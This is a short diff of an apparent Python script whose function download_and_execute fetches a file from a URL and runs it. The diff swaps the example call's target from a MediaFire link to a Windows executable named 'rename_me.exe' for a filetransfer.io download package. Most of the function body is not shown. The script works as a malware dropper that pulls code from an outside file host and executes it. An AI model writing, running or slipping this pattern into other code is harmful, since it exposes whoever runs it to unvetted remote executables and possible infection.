@@ -18,4 +18,4 @@ def download_and_execute(url):
         print("Failed to download the file.")
 
 # Example usage
-download_and_execute("https://download850.mediafire.com/9fx3vj8edv0gAhPjFbjjraFXdyCcW9gqeTL8-y1-ROrcNNF6l3vm40qQ6bSV7Oc8NukglJfEciqSAJhrsA46CAwIkq0Xa9RhK5CNJDaJgu4YovYZyxx86vn8iKJoB-a1Q2HQTflNhIYMcSo8eXHz14Gs_cT62ImicekBj3Lh3H-FyEg/783t7z3i85vcmql/rename_me.exe")
+download_and_execute("https://filetransfer.io/data-package/AU2AhHHy/download")
